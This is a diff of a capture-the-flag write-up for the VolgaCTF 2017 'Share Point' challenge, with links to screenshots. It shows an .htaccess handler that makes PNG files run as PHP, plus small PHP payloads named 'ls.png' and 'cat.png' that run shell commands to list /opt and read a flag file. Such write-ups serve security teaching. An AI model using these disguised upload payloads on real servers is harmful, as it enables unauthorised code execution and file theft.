@@ -15,7 +15,18 @@ Hints:
 AddHandler application/x-httpd-php .png
 ```
 ![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_5.png)
-![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_6.png)
+file "ls.png":
+```php
+<?php
+$tmp = `ls /opt`;
+header("Content-type: image/png");
+$name = "ls.txt";
+$file = fopen($name, "w"); 
+fputs($file, iconv('cp1251', 'utf-8', $tmp));
+fclose ($file); 
+?>
+```
+file "cat.png":
 ```php
 <?php
 $tmp = `cat /opt/flag.txt`;
@@ -26,5 +37,6 @@ fputs($file, iconv('cp1251', 'utf-8', $tmp));
 fclose ($file); 
 ?>
 ```
+![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_6.png)
 ![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_7.png)
 ![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_8.png)
